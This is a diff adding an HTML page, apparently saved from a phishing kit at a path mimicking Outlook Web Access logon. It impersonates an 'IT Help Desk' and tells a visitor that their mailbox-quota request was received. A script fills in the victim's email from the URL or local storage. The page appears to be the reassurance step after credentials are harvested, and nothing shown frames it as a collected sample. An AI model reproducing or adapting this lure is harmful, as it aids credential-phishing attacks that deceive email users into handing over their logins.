@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<!-- saved from url=(0097)https://mettatrust.wearedesigners.net/owa-auth-logon-aspx/success.html?email=together%40gmail.com -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Request Submitted – IT Help Desk</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="https://mettatrust.wearedesigners.net/owa-auth-logon-aspx/favicon.ico">
+  <link href="./Request Submitted – IT Help Desk_files/css2" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #f3fafd;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .success-card {
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 6px 26px 0 rgba(0,120,212,0.13);
+      padding: 48px 36px 34px 36px;
+      min-width: 320px;
+      width: 100%;
+      max-width: 520px;
+      text-align: center;
+      border: 2.5px solid #0078d4;
+    }
+    .checkmark-anim {
+      color: #14c740;
+      font-size: 3.2em;
+      margin-bottom: 13px;
+      animation: popin 0.7s cubic-bezier(.18,.75,.57,1.46);
+    }
+    @keyframes popin {
+      0% {transform: scale(0.7);}
+      70% {transform: scale(1.23);}
+      100% {transform: scale(1);}
+    }
+    .succ-title {
+      font-size: 1.3em;
+      font-weight: 600;
+      color: #0078d4;
+      margin-bottom: 10px;
+    }
+    .succ-message {
+      font-size: 1.04em;
+      color: #36434e;
+      line-height: 1.68;
+      margin-bottom: 22px;
+    }
+    .succ-email {
+      color: #0078d4;
+      font-weight: 600;
+      word-break: break-all;
+    }
+    .footer img {
+      width: 120px;
+      opacity: 0.88;
+      margin-top: 18px;
+    }
+    @media (max-width: 500px) {
+      .success-card {padding: 18px 6vw 10px 6vw; min-width: 0;}
+      .footer img {width: 54px;}
+    }
+  </style>
+</head>
+<body>
+  <div class="success-card">
+    <div class="checkmark-anim">✔</div>
+    <div class="succ-title">Request Submitted!</div>
+    <div class="succ-message">
+      We acknowledge receipt of your request to increase the mailbox quota for <span class="succ-email" id="emailDisplay">together@gmail.com</span>. Our IT Support Team is currently reviewing your request and will begin processing it shortly.<br><br>
+      Once the adjustment has been completed, you will receive a confirmation email with the updated quota details. If we require any additional information to complete your request, a member of our team will contact you directly.<br><br>
+      In the meantime, please continue to monitor your mailbox usage to prevent any potential service interruptions. If you notice any issues or have additional questions, feel free to reach out to our IT Support Team.
+    </div>
+    <div class="footer">
+      <img src="./Request Submitted – IT Help Desk_files/image.png" alt="Logo">
+    </div>
+  </div>
+  <script>
+    function getQueryParam(param) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(param);
+    }
+    const email = getQueryParam('email') || localStorage.getItem('savedEmail');
+    if (email) document.getElementById('emailDisplay').textContent = email;
+  </script>
+
+
+</body></html>
